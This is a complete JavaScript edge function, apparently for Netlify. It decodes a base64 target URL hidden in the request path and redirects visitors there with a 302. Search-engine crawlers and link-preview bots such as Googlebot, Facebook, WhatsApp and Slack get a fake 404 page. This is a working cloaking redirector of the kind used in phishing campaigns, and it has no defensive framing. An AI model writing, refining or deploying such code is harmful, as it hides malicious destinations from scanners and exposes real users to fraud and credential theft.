export default async (request, context) => {
  const url = new URL(request.url);
  const userAgent = request.headers.get("user-agent") || "";
  const clientIP = context.ip;
  const cookies = request.headers.get("cookie") || "";

  // BAKE-IN the 404 HTML to avoid "fetch" errors
  const FAKE_404_HTML = `<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}h1{border-right:1px solid #ccc;padding:10px 20px;margin-right:20px;}span{font-size:14px;}</style></head><body><h1>404</h1><span>This page could not be found.</span></body></html>`;

  const serveFake404 = () => new Response(FAKE_404_HTML, {
    status: 404,
    headers: { "Content-Type": "text/html" }
  });

  // 1. EXTRACT DATA
  const pathParts = url.pathname.split(".");
  const base64Data = pathParts.length > 1 ? pathParts[pathParts.length - 1] : null;

  // 2. BOT LIST
  const blockedAgents = ["googlebot", "bingbot", "yandex", "baiduspider", "facebookexternalhit", "twitterbot", "whatsapp", "slackbot"];
  const isBot = blockedAgents.some(agent => userAgent.toLowerCase().includes(agent.toLowerCase()));

  if (isBot) return serveFake404();

  // 3. DECODE & REDIRECT
  if (base64Data) {
    try {
      // Robust decoding
      const normalized = base64Data.replace(/-/g, '+').replace(/_/g, '/');
      const decodedUrl = atob(normalized);
      
      if (!decodedUrl.startsWith("http")) throw new Error();

      const response = Response.redirect(decodedUrl, 302);
      response.headers.append("Set-Cookie", "passed_trap=true; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure");
      return response;
    } catch (e) {
      return serveFake404();
    }
  }

  if (cookies.includes("passed_trap=true")) return; 

  return serveFake404();
};

export const config = { path: "/*" };
